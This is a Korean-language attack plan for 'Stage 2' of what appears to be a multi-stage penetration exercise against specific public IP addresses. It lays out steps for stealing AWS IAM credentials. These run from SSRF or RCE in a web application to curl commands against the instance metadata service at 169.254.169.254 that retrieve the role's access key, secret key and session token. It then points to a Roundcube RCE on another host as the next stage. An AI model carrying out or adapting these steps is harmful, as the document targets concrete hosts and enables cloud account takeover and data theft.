# Stage 2 개요: Target Server - IMDS (3.37.135.243)

**현재 상태**: 미완료 - 동료 자료만 사용 가능  
**참고 자료**: 3.37.135.243/  

---

## 📋 목표

AWS EC2 인스턴스 메타데이터 서비스(IMDS)에 접근하여 AWS IAM 자격증명을 획득하고, Stage 3 진행을 위한 정보 수집

---

## 🔍 알려진 정보

- **Host**: 3.37.135.243 (AWS EC2 인스턴스 추정)
- **Port**: 80 (HTTP), 443 (HTTPS)
- **Service**: 웹 애플리케이션 + AWS IMDS
- **목표**: IMDS 메타데이터 접근 → IAM 자격증명 획득

---

## 공략 예상 경로

### AWS IMDS (Instance MetaData Service)

```
웹 애플리케이션 RCE 또는 SSRF
    ↓
http://169.254.169.254/latest/meta-data/ 접근
    ↓
IAM 역할 조회
    ↓
http://169.254.169.254/latest/meta-data/iam/security-credentials/{role}/
    ↓
Access Key + Secret Key 획득
```

### Step 1: SSRF 취약점 찾기

**예상 방법** (동료 자료 참고):
- 웹 서비스의 URL 입력 필드에서 SSRF 취약점 찾기
- 또는 RCE를 통해 curl로 메타데이터 서비스 접근

### Step 2: IMDS 메타데이터 조회

```bash
# curl로 IMDS 접근 (내부에서만 가능)
curl http://169.254.169.254/latest/meta-data/

# 응답 예:
# iam/
# public-hostname/
# public-ipv4/
# ...
```

### Step 3: IAM 역할 조회

```bash
# IAM 역할 확인
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 응답 예: {role-name}
```

### Step 4: IAM 자격증명 획득

```bash
# 자격증명 조회
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/{role-name}/

# 응답 예:
# {
#   "Code": "Success",
#   "AccessKeyId": "ASIA...",
#   "SecretAccessKey": "...",
#   "Token": "...",
#   "Expiration": "..."
# }
```

---

## 📂 참고 자료 위치

**동료 자료**:
- `3.37.135.243/` - 모든 Stage 2 관련 자료
- 내용: SSRF/RCE 기법, IMDS 접근 로그, 획득한 자격증명 정보

**추천 순서**:
1. `artifacts/` - SSRF/RCE 취약점 분석
2. `logs/` - IMDS 접근 로그
3. `evidence/` - 획득한 자격증명 증거

---

## 🔗 Stage 2와 Stage 3의 연결

```
Stage 2 완료
    ↓ (IMDS에서 AWS 자격증명 획득)
Stage 3으로 진행
    ↓ (13.125.104.131:30083 Roundcube RCE)
Stage 3 완료 후 Stage 4로 진행
```

---

## ⚠️ 주의

**이 stage는 직접 실행하지 않았으므로**, 동료 자료를 참고하여 같은 절차를 따르면 됩니다.

---

**다음**: Stage 3로 진행 (상세 가이드: STAGE3_DETAILED_WRITEUP.md)

